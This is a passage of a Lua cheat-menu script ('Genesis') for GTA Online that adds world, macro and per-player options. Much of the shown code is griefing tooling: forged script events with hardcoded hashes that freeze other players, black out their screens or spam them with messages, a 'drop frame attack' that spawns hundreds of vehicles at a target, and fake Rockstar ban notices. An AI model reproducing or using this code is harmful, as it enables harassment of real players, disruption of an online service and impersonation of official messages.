        ct = ct + 1
    end
    util.toast("-Genesis-\n\nSuccessfull Deleted "..ct.." Objects.")
end)

menu.action(MenuWorldClearSpec, "Clear Pickups", {"gsworldclearpickups"}, "Deletes all Pickups.", function(on_click)
    local ct = 0
    for k,ent in pairs(entities.get_all_pickups_as_handles()) do
        entities.delete_by_handle(ent)
        util.toast("Successfully Deleted "..ct.." Pickups")
    end
end)


--[[| World/Projectile/ProjectileMarking/MarkProjectiles/ |]]--
blip_projectiles = false
blip_proj_missles = false
blip_proj_bombs = false
blip_proj_grenades = false
blip_proj_mines = false
blip_proj_misc = false
menu.toggle(MenuWrldProjOptions, "Mark Projectiles", {"gsmarkprojectiles"}, "Puts a Marker on any Slow-Moving Projectile.\nThis includes things like C4, Proximity Mines, Missles, Etc.\nWill also Mark People using Explosive Rounds Under 'Misc' Category.", function(on)
    blip_projectiles = on
    mod_uses("object", if on then 1 else -1)
end)

menu.toggle(MenuWrldProjOptions, "Mark Missles", {"gsmarkmissles"}, "Wether to Mark Different types of Missles on the Map.", function(on)
    blip_proj_missles = on
    mod_uses("object", if on then 1 else -1)
end)

menu.toggle(MenuWrldProjOptions, "Mark Bombs", {"gsmarkbombs"}, "Wether to Mark Bombs Dropped from Planes on the Map.", function(on)
    blip_proj_bombs = on
    mod_uses("object", if on then 1 else -1)
end)

menu.toggle(MenuWrldProjOptions, "Mark Grenades", {"gsmarkgrenades"}, "Wether to Mark Different types of Grenades on the Map.", function(on)
    blip_proj_grenades = on
    mod_uses("object", if on then 1 else -1)
end)

menu.toggle(MenuWrldProjOptions, "Mark Mines", {"gsmarkmines"}, "Wether to Mark Different types of Mines on the Map.", function(on)
    blip_proj_mines = on
    mod_uses("object", if on then 1 else -1)
end)

menu.toggle(MenuWrldProjOptions, "Mark Misc", {"gsmarkmisc"}, "Wether to Mark Miscellaneous Projectiles like Flares on the Map.", function(on)
    blip_proj_misc = on
    mod_uses("object", if on then 1 else -1)
end)


--[[| World/Projectile/ProjectileMarking/MarkProjectileColours/ |]]--
proj_blip_missle_col = 75
menu.slider(MenuWrldProjColours, "Missle Colour", {"gsmarkmisslecol"}, "What Colour Missle Markers should be on the Map.\n\n0 - White\n1 - Red\n2 - Orange\n3 - Yellow\n4 - Green\n5 - Light Blue\n6 - Dark Blue", 0, 6, 0, 1, function(value)
    if value == 1 then proj_blip_missle_col = 75
    elseif value == 2 then proj_blip_missle_col = 47
    elseif value == 3 then proj_blip_missle_col = 46
    elseif value == 4 then proj_blip_missle_col = 69
    elseif value == 5 then proj_blip_missle_col = 77
    elseif value == 6 then proj_blip_missle_col = 78 end
end)

proj_blip_bomb_col = 75
menu.slider(MenuWrldProjColours, "Bomb Colour", {"gsmarkbombcol"}, "What Colour Bomb Markers should be on the Map.\n\n0 - White\n1 - Red\n2 - Orange\n3 - Yellow\n4 - Green\n5 - Light Blue\n6 - Dark Blue", 0, 6, 0, 1, function(value)
    if value == 1 then proj_blip_bomb_col = 75
    elseif value == 2 then proj_blip_bomb_col = 47
    elseif value == 3 then proj_blip_bomb_col = 46
    elseif value == 4 then proj_blip_bomb_col = 69
    elseif value == 5 then proj_blip_bomb_col = 77
    elseif value == 6 then proj_blip_bomb_col = 78 end
end)

proj_blip_grenade_col = 75
menu.slider(MenuWrldProjColours, "Grenade Colour", {"gsmarkgrenadecol"}, "What Colour Grenade Markers should be on the Map.\n\n0 - White\n1 - Red\n2 - Orange\n3 - Yellow\n4 - Green\n5 - Light Blue\n6 - Dark Blue", 0, 6, 0, 1, function(value)
    if value == 1 then proj_blip_grenade_col = 75
    elseif value == 2 then proj_blip_grenade_col = 47
    elseif value == 3 then proj_blip_grenade_col = 46
    elseif value == 4 then proj_blip_grenade_col = 69
    elseif value == 5 then proj_blip_grenade_col = 77
    elseif value == 6 then proj_blip_grenade_col = 78 end
end)

proj_blip_mine_col = 75
menu.slider(MenuWrldProjColours, "Mine Colour", {"gsmarkminecol"}, "What Colour Mine Markers should be on the Map.\n\n0 - White\n1 - Red\n2 - Orange\n3 - Yellow\n4 - Green\n5 - Light Blue\n6 - Dark Blue", 0, 6, 0, 1, function(value)
    if value == 1 then proj_blip_mine_col = 75
    elseif value == 2 then proj_blip_mine_col = 47
    elseif value == 3 then proj_blip_mine_col = 46
    elseif value == 4 then proj_blip_mine_col = 69
    elseif value == 5 then proj_blip_mine_col = 77
    elseif value == 6 then proj_blip_mine_col = 78 end
end)

proj_blip_misc_col = 46
menu.slider(MenuWrldProjColours, "Misc Colour", {"gsmarkmisccol"}, "What Colour Misc Markers should be on the Map.\n\n0 - White\n1 - Red\n2 - Orange\n3 - Yellow\n4 - Green\n5 - Light Blue\n6 - Dark Blue", 0, 6, 0, 1, function(value)
    if value == 1 then proj_blip_misc_col = 75
    elseif value == 2 then proj_blip_misc_col = 47
    elseif value == 3 then proj_blip_misc_col = 46
    elseif value == 4 then proj_blip_misc_col = 69
    elseif value == 5 then proj_blip_misc_col = 77
    elseif value == 6 then proj_blip_misc_col = 78 end
end)


--[[| World/Projectile/ProjectileMovement/ |]]--
projectile_spaz = false
menu.toggle(MenuWrldProjMovement, "Projectile Random", {"gsprojectilerandom"}, "Applies Random Velocity to any Projectiles on the Map. Makes them Spaz out.", function(on)
    projectile_spaz = on
    mod_uses("object", if on then 1 else -1)
end)

slow_projectiles = false
menu.toggle(MenuWrldProjMovement, "Slow Projectiles", {"gsprojectileslow"}, "Makes All Projectiles move Extremely Slow.", function(on)
    slow_projectiles = on
    mod_uses("object", if on then 1 else -1)
end)


--[[| World/Chaos |]]--
menu.toggle_loop(MenuWrldChaos, "Fling Vehicles", {"gsflingvehicles"}, "Applies Random Velocities to every Vehicle.", function(on)
    allVehicles = entities.get_all_vehicles_as_handles()
    for k,obj in pairs(allVehicles) do
        ENTITY.APPLY_FORCE_TO_ENTITY(obj, 1, math.random(0,3500), math.random(0,3500), math.random(0,3500), math.random(0,3500), math.random(0,3500), math.random(0,3500), 1, true, false, false, true, true)
    end
end)

menu.toggle_loop(MenuWrldChaos, "Sieze Vehicles", {"gssiezevehicles"}, "Makes every Vehicle look like it's having a Seizure.", function(on)
    allVehicles = entities.get_all_vehicles_as_handles()
    for k,obj in pairs(allVehicles) do
        ENTITY.APPLY_FORCE_TO_ENTITY(obj, 1, math.random(0,100), math.random(0,100), math.random(0,100), math.random(0,100), math.random(0,100), math.random(0,100), 1, true, false, false, true, true)
    end
end)



--[[| Game/FakeAlerts/ |]]--
menu.action(MenuAlerts, "Ban Message", {"gsfakeban"}, "A Fake Ban Message.", function(on_click)
    show_custom_rockstar_alert("You have been Banned from Grand Theft Auto Online Permanently.~n~Return to Grand Theft Auto V.")
end)

menu.action(MenuAlerts, "Services Unavailable", {"cafakeservicesunavailable"}, "A Fake 'Servives Unavailable' Message.", function(on_click)
    show_custom_rockstar_alert("The Rockstar Game Services are Unavailable right now.~n~Please Return to Grand Theft Auto V.")
end)

menu.action(MenuAlerts, "Custom Alert", {"gsfakecustomalert"}, "Lets you input a Custom Alert to Show.", function(on_click)
    util.toast("-Genesis-\n\nType what you want the Alert to Say. Use '~n~' to make a Newline, like Pressing Enter.")
    menu.show_command_box("gsfakecustomalert ")
end, function(on_command)
    show_custom_rockstar_alert(on_command)
end)


--[[| Game/MacroOptions/ |]]--
macroDelay = 50
macroRunDelay = 0
macroAnnounceEnds = false
menu.toggle(MenuGameMacros, "Announce Start and Finish", {"gsmacroannouncestartfinish"}, "Toasts on Screen when the Macro youare Running has Started, and when it has Finished.", function(on)
    if on then macroAnnounceEnds = true else macroAnnounceEnds = false end
end)

menu.slider(MenuGameMacros, "Click Delay", {"gsmacroclickdelay"}, "The Delay between Every Click the Macro does, in Milliseconds. 30ms is Often the Limit, and will Almost Always Fail. Increase beyond 50ms if the Macro is Missing off by one, or not Working.", 20, 1000, 50, 10, function(value)
    macroDelay = value
end)

menu.slider(MenuGameMacros, "Run Delay", {"gsmacrorundelay"}, "The Time, in Milliseconds before the Macro will Run after you Click it.", 0, 10000, 0, 50, function(value)
    macroRunDelay = value
end)


--[[| Game/MacroOptions/Macros/ |]]--  





--[[| Genesis/ |]]--
menu.divider(MenuCredits, "Main Developer")

menu.hyperlink(MenuCredits, "Github", "https://github.com/1delayyy/Genesis-script?tab=readme-ov-file")

menu.action(MenuCredits, "1delay.", {"gscredits.1delay."}, "This is My discord, and I did half of Everything, from Scratch.", function(on_click)
    util.toast("- 1delay. -\n\nThis is My discord, and I did half of Everything, from Scratch.")
end)

menu.divider(MenuCredits, "Supporters")

menu.action(MenuCredits, "notcracky", {"gscredits.cracky"}, "My Friend, Gave A Few Ideas's To Add To My Script :).", function(on_click)
    util.toast(" - notcracky -\n\nMy Friend, Gave A Few Ideas's To Add To My Script :).")
end)

menu.action(MenuCredits, "44_69_6d_61", {"gscredits.44_69_6d_61"}, "Another Friend Of Mine, also gave me some Ideas on what to Add to the Script.", function(on_click)
    util.toast(" - 44_69_6d_61 -\n\nAnother Friend Of Mine, also gave me some Ideas on what to Add to the Script.")
end)

menu.action(MenuCredits, "Lumineyyy_xx", {"gscredits.Lumineyyy_xx"}, "Good Friend Of Mine, Shared Code For Barcode And Chinese Functions. <3", function(on_click)
    util.toast(" - Lumineyyy_xx -\n\n.Good Friend Of Mine, Shared Code For Barcode And Chinese Functions. <3")
end)


--[[| Genesis/Credits/ |]]--
menu.divider(MenuMisc, "Patch Notes")

menu.hyperlink(MenuMisc, "Patch Notes/ChangeLog", "https://github.com/1delayyy/Genesis-script/blob/master/ChangeLog.txt")




--[[ ||| PLAYER ROOT ||| ]]--
function PlayerAddRoot(csPID)
    menu.divider(menu.player_root(csPID), "<3 Genesis <3")
    MenuPlayerRoot = menu.list(menu.player_root(csPID), "Genesis", {"gsplayer"}, "Genesis Options for Selected Player.") ; menu.divider(MenuPlayerRoot, "Player Options")
    menu.divider(menu.player_root(csPID), "^^ Genesis ^^")
        
    MenuPlayerTeleport = menu.list(MenuPlayerRoot, "Teleport", {"gsteleport"}, "Genesis Teleport Options For The Selected Player.") ; menu.divider(MenuPlayerTeleport, "Player Teleport Options")
    MenuPlayerFriendly = menu.list(MenuPlayerRoot, "Friendly", {"gsplayerfriendly"}, "Genesis Friendly Options for the Selected Player.") ; menu.divider(MenuPlayerFriendly, "Player Friendly Options") 
    MenuPlayerFun = menu.list(MenuPlayerRoot, "Fun", {"gsplayerfun"}, "Genesis Fun Options for the Selected Player.") ; menu.divider(MenuPlayerFun, "Player Fun Options")    
    MenuPlayerTrolling = menu.list(MenuPlayerRoot, "Trolling", {"gsplayertrolling"}, "Genesis Trolling Options for the Selected Player.") ; menu.divider(MenuPlayerTrolling, "Player Trolling Options") 
    MenuPlayerVehicle = menu.list(MenuPlayerRoot, "Vehicle", {"gsplayervehicle"}, "Genesis Vehicle Options for the Selected Player.") ; menu.divider(MenuPlayerVehicle, "Player Vehicle Options")
        MenuPlayerTrollingSpawn = menu.list(MenuPlayerTrolling, "Spawn Options", {"gstrolling"}, "Trolling Options that Involve Spawning things.") ; menu.divider(MenuPlayerTrollingSpawn, "Trolling Spawn Options")  
        MenuPlayerTrollingCage = menu.list(MenuPlayerTrolling, "Cage Options", {"gsplayertrollingcage"}, "Different Types of Cages to put this Player in.") ; menu.divider(MenuPlayerTrollingCage, "Trolling Cage Options")
        MenuPlayerTrollingFreeze = menu.list(MenuPlayerTrolling, "Freeze Options", {"gsplayertrollingfreeze"}, "Freeze Options for this Player.") ; menu.divider(MenuPlayerTrollingFreeze, "Trolling Freeze Options")
    MenuPlayerKilling = menu.list(MenuPlayerRoot, "Killing", {"gsplayerkilling"}, "Genesis Killing Options for the Selected Player.") ; menu.divider(MenuPlayerKilling, "Player Killing Options")    
        MenuPlayerKillingOwned = menu.list(MenuPlayerKilling, "Owned", {"gsplayerkillingowned"}, "Shows that you Killed them in the Killfeed.") ; menu.divider(MenuPlayerKillingOwned, "Owned Killing Options")
        MenuPlayerKillingAnon = menu.list(MenuPlayerKilling, "Anonymous", {"gsplayerkillinganon"}, "Just says they Died in the Killfeed.") ; menu.divider(MenuPlayerKillingAnon, "Anonymous Killing Options")
    MenuPlayerRemoval = menu.list(MenuPlayerRoot, "Removal", {"gsplayerremoval"}, "Genesis Removal Options for the Selected Player, like Kicks and Crashes.") ; menu.divider(MenuPlayerRemoval, "Player Removal Options")
        MenuPlayerRemovalKick = menu.list(MenuPlayerRemoval, "Kicks", {"gsplayerremovalkick"}, "Kick Options for this Player.") ; menu.divider(MenuPlayerRemovalKick, "Player Kick Options")
        MenuPlayerRemovalCrash = menu.list(MenuPlayerRemoval, "Crashes", {"gsplayerremovalcrash"}, "Crash Options for this Player.") ; menu.divider(MenuPlayerRemovalCrash, "Player Crash Options")
    
     --Player Root Teleport

tpoptions = menu.list(MenuPlayerTeleport, "TP Options", {}, "", function(); end)

griefingtpp = menu.list(MenuPlayerTeleport, "TP Player", {}, "", function(); end)

menu.action(griefingtpp, "Teleport To Them", {"goingtheere"}, "", function()
menu.trigger_commands("tp" .. players.get_name(csPID))
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.action(griefingtpp, "Teleport To Me", {"cometome"}, "", function()
menu.trigger_commands("summon" .. players.get_name(csPID))
end, nil, nil, COMMANDPERM_FRIENDLY)

griefingtp = menu.list(tpoptions, "TP All Players", {}, "", function(); end)

menu.action(griefingtp, "TP Everyone To MazeBank", {"tpallmazebank"}, "Teleports all players to mazebank you.", function()
excludeselected = true
menu.trigger_commands("tpplayersmazebank")
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.action(griefingtp, "TP All Players to me", {"tpallplayers"}, "Teleports all players to you.", function()
menu.trigger_commands("say " .. " Get on the bike :)")
menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(csPID) .. " manchez")
util.toast("Give them a second to get on...")
excludeselected = true
menu.trigger_commands("tpplayers")
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.action(griefingtp, "TP All Players Near me", {"tpallnear"}, "Teleports all players near you.", function()
menu.trigger_commands("aptmeall")
end, nil, nil, COMMANDPERM_AGGRESSIVE)


    --Player Root Friendly

local hugs = menu.list(MenuPlayerFriendly, "Hug Player", {"hug"}, "Note: Make sure they are stood still.")

tpf_units = 1
menu.action(hugs,"Hug Player 1", {}, "Make Their Day Better.", function()
menu.trigger_commands("freeze" ..  PLAYER.GET_PLAYER_NAME(csPID) .. " on")
menu.trigger_commands("tp" .. PLAYER.GET_PLAYER_NAME(csPID))
util.yield(200)
menu.trigger_commands("nocollision" .. " on")
menu.trigger_commands("playanimhug")
util.yield(300)
menu.trigger_commands("freeze" ..  PLAYER.GET_PLAYER_NAME(csPID) .. " off")
menu.trigger_commands("nocollision" .. " off")
local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, tpf_units, 0)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos['x'], pos['y'], pos['z'], true, false, false)
end)

tpf_units = -0.7
menu.action(hugs,"Hug Player 2", {"hugs"}, "Note: Make sure they are stood still. Like first one but tiny bit different.", function()
menu.trigger_commands("freeze" ..  PLAYER.GET_PLAYER_NAME(csPID) .. " on")
menu.trigger_commands("tp" .. PLAYER.GET_PLAYER_NAME(csPID))
util.yield(200)
menu.trigger_commands("nocollision" .. " on")
menu.trigger_commands("playanimhug2")
util.yield(300)
menu.trigger_commands("freeze" ..  PLAYER.GET_PLAYER_NAME(csPID) .. " off")
menu.trigger_commands("nocollision" .. " off")
local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, tpf_units, 0)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos['x'], pos['y'], pos['z'], true, false, false)
end)

menu.action(MenuPlayerFriendly, "Max Player", {"max"}, "Turns on Godmode, auto heal, ceopay, vehiclegodmode, vehicle boost, never wanted, gives all weapons, ammo/infinite and parachute all at once.", function ()
menu.trigger_commands("arm".. players.get_name(csPID) .. "all")
menu.trigger_commands("bail".. players.get_name(csPID))
menu.trigger_commands("boost".. players.get_name(csPID))
menu.trigger_commands("ceopay".. players.get_name(csPID))
menu.trigger_commands("autoammo".. players.get_name(csPID))
menu.trigger_commands("autoheal".. players.get_name(csPID))
menu.trigger_commands("removestickys".. players.get_name(csPID))
menu.trigger_commands("givevehgod".. players.get_name(csPID))
menu.trigger_commands("paragive".. players.get_name(csPID))
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(MenuPlayerFriendly, "Give Vehicle Stealth Godmode", {"gsfriendlygivevehstealthgm"}, "Gives the Player Vehicle Godmode that won't be Detected by Most menus.", function()
        local pidPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(pidPed), true, true, true, true, true, false, false, true)
        end, function() 
        local pidPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(pidPed), false, false, false, false, false, false, false, false)
    end)

menu.action(MenuPlayerFriendly, "Fix loading screen", {"fixme"}, "Try to fix player's infinite loading screen by giving him script host and teleporting to nearest apartment.", function()
menu.trigger_commands("givesh" .. players.get_name(csPID))
menu.trigger_commands("aptme" .. players.get_name(csPID))
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(MenuPlayerFriendly, "Remove Stickys From Car", {"removestickys"}, "", function(toggle)
local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID), true)
NETWORK.REMOVE_ALL_STICKY_BOMBS_FROM_ENTITY(car)
end)

menu.toggle_loop(MenuPlayerFriendly, "Infinity Ammo", {"autoammo"}, "Endless ammo for players", function(toggle)
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local weaphash = WEAPON.GET_SELECTED_PED_WEAPON(ped)
local ammo = WEAPON.GET_AMMO_IN_PED_WEAPON(ped, weaphash)
if ammo < 9999 then
WEAPON.ADD_AMMO_TO_PED(ped, weaphash, 9999)
end
end)

menu.action(
    MenuPlayerFriendly,
    "Send Friend Request",
    {"friend"},
    "",
    function()
        menu.show_command_box("historynote " .. PLAYER.GET_PLAYER_NAME(csPID) .. "Friends List")
        menu.show_command_box("befriend " .. PLAYER.GET_PLAYER_NAME(csPID))
    end,
    nil,
    nil,
    COMMANDPERM_FRIENDLY
)


    --Player Root Fun

    menu.action(MenuPlayerFun, "Custom Job Invite", {"gsfunjobinv"}, "Sends the Player a Notification that says you Started the a Job, with the Name of it being the Text you Input.", function(on_click)
        menu.show_command_box_click_based(on_click, "gsfunjobinv "..players.get_name(csPID):lower().." ") end, function(input)
            local event_data = {0x8E38E2DF, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
            input = input:sub(1, 127)
            for i = 0, #input -1 do
                local slot = i // 8
                local byte = string.byte(input, i + 1)
                event_data[slot + 3] = event_data[slot + 3] | byte << ((i-slot * 8)* 8)
            end
            util.trigger_script_event(1 << csPID, event_data)
    end)

    menu.action(MenuPlayerFun, "Custom Text / Label", {"gsfunlabel"}, "Sends the Person a Preset Text, since you can't just Send normal Texts on PC.", function() menu.show_command_box("gsplayerfunct "..players.get_name(csPID).." ") end, function(label)
        local event_data = {0xD0CCAC62, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
        local out = label:sub(1, 127)
        if HUD.DOES_TEXT_LABEL_EXIST(label) then
            for i = 0, #out -1 do
                local slot = i // 8
                local byte = string.byte(out, i + 1)
                event_data[slot + 3] = event_data[slot + 3] | byte << ( (i - slot * 8) * 8)
            end
            util.trigger_script_event(1 << csPID, event_data)
        else
            util.toast("-Genesis-\n\nThat is not a Valid Label. No Texts have been Sent.")
        end
    end)



    --Player Root Trolling

        --Trolling Spawn Options

    local eg = menu.list(MenuPlayerTrolling, "Player Trolling", {}, "Player Trolling Options")


    menu.toggle_loop(eg, "Cyclic Spitfire", { "" }, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)

        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)

        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 12, 100.0, true, false, 0.0)

    end)

    menu.toggle_loop(eg, "Water Spray", { "" }, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)

        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)

        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 13, 100.0, true, false, 0.0)

    end)
    menu.toggle_loop(eg, "Mixed Prank", { "" }, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], math.random(0, 82), 1.0, true, false, 0.0)
    end)
    menu.toggle_loop(eg, "Black screen for players", { "" }, "", function(on_click)
        util.trigger_script_event(1 << csPID,
            { -555356783, csPID, math.random(1, 32), 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(csPID), 0, 0, 0, 0, 0, 0, 0,
                0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 })
        util.yield(1000)
    end)
    menu.toggle_loop(eg, "Freeze V1", { "" }, "", function(on_click)
        util.trigger_script_event(1 << csPID, { 0x4868BC31, csPID, 0, 0, 0, 0, 0 })
        util.yield(500)
    end)
    menu.toggle_loop(eg, "Freeze V2", { "" }, "", function(on_click)
        util.trigger_script_event(1 << csPID, { 0x7EFC3716, csPID, 0, 1, 0, 0 })
        util.yield(500)
    end)
    menu.toggle_loop(eg, "Freeze V3", { "" }, "", function(on_click)

        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
    end)

    menu.toggle_loop(eg, "Spam Bombing", { "" }, "", function(on_click)
        util.trigger_script_event(1 << csPID, { 0xDA29E2BC, csPID, math.random(0, 0xB2), 0, 0, 0 })
        util.yield()
    end)

    menu.toggle_loop(eg, "Apartment Invitation Message Bombing", { "" }, "", function(on_click)
        util.trigger_script_event(1 << csPID, { 0x4246AA25, csPID, math.random(1, 0x6) })
        util.yield()
    end)

    menu.action(eg, "Knife Cage", { "" }, "", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
        local hash = util.joaat("bkr_prop_moneypack_03a")
        STREAMING.REQUEST_MODEL(hash)

        while not STREAMING.HAS_MODEL_LOADED(hash) do
            util.yield()
        end
        local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false)
        local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false)
        local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false)
        local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false)

        local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false)
        local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false)
        local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false)
        local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false)

        local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false)
        cages[#cages + 1] = cage_object
        cages[#cages + 1] = cage_object
        util.yield(15)
        local rot = ENTITY.GET_ENTITY_ROTATION(cage_object)
        rot.y     = 90
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
    end)

    menu.action(eg, "Christmas Cage", { "" }, "", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
        local hash = util.joaat("ch_prop_tree_02a")
        STREAMING.REQUEST_MODEL(hash)

        while not STREAMING.HAS_MODEL_LOADED(hash) do
            util.yield()
        end
        local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false)
        local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false)
        local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false)
        local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false)
        local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false)
        cages[#cages + 1] = cage_object
        cages[#cages + 1] = cage_object
        util.yield(15)

        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
    end)


    menu.action(eg, "Drop frame attack (press more for better effect)", {}, "", function()
        while not STREAMING.HAS_MODEL_LOADED(447548909) do
            STREAMING.REQUEST_MODEL(447548909)
            util.yield(10)
        end
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
        spam_amount = 300
        while spam_amount >= 1 do
            entities.create_vehicle(447548909, PlayerPedCoords, 0)
            spam_amount = spam_amount - 1
            util.yield(10)
        end
    end)
        
        
        menu.action(MenuPlayerTrollingSpawn, "Drop Taco Truck", {"gsplayertrollingspawndtt"}, "Drops a Taco Truck on the Player's Head.", function(on_click)
        local pidPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        local abovePidPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 0, 10)
        local vehHash = util.joaat("taco")
        STREAMING.REQUEST_MODEL(vehHash)
        while not STREAMING.HAS_MODEL_LOADED(vehHash) do util.yield() end
        local spawnedTruck = VEHICLE.CREATE_VEHICLE(vehHash, abovePidPed.x, abovePidPed.y, abovePidPed.z, 0, true, true, false)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehHash)
        util.yield(3000)
        entities.delete_by_handle(spawnedTruck)
    end)

        --Player Root Vehicle

local function spawn_object_in_front_of_ped(ped, hash, ang, room, zoff, setonground)
coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, room, zoff)
request_model_load(hash)
hdng = ENTITY.GET_ENTITY_HEADING(ped)
new = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
ENTITY.SET_ENTITY_HEADING(new, hdng+ang)
if setonground then
OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(new)
end
return new
end

read_global = {
byte = function(global)
local address = memory.script_global(global)
return memory.read_byte(address)
end,
int = function(global)
local address = memory.script_global(global)
return memory.read_int(address)
end,
float = function(global)
local address = memory.script_global(global)
return memory.read_float(address)
end,
string = function(global)
local address = memory.script_global(global)
return memory.read_string(address)
end
}

function get_random_ped()
peds = entities.get_all_peds_as_handles()
npcs = {}
valid = 0
for k,p in pairs(peds) do
if p ~= nil and not is_ped_player(p) then
table.insert(npcs, p)
valid = valid + 1
end
end
return npcs[math.random(valid)]
end

function DELETE(ent)
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, true, true)
entities.delete_by_handle(ent)
end



vehicle_kicks = menu.list(MenuPlayerVehicle, "Vehicle Kicks", {"vehiclekicks"}, "", function(); end)
troll_sub_vehicle_tab = menu.list(MenuPlayerVehicle, "Trolling Options", {}, "", function(); end)
health_sub_vehicle_tab = menu.list(MenuPlayerVehicle, "Health and Appearance Options", {}, "", function(); end)
givevehicle = menu.list(MenuPlayerVehicle, "Give Player A Vehicle", {}, "", function(); end)

menu.action(givevehicle, "Give A MK2", {"givemk2"}, "", function()
menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(csPID) .. " oppressor2")
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.action(givevehicle, "Give A Deluxo", {"givedeluxo"}, "", function()
menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(csPID) .. " deluxo")
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.action(givevehicle, "Give A Festival Bus", {"givefestivalbus"}, "", function()
menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(csPID) .. " pbus2")
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.action(givevehicle, "Give A Forklift", {"giveforklift"}, "", function()
menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(csPID) .. " forklift")
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.action(givevehicle, "Give A Khanjali", {"givekhanjali"}, "", function()
menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(csPID) .. " khanjali")
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.action(givevehicle, "Give A Future Shock Sasquatch", {"givesasquatch"}, "", function()
menu.show_command_box("as " .. PLAYER.GET_PLAYER_NAME(csPID) .. " monster4")
end, nil, nil, COMMANDPERM_FRIENDLY)

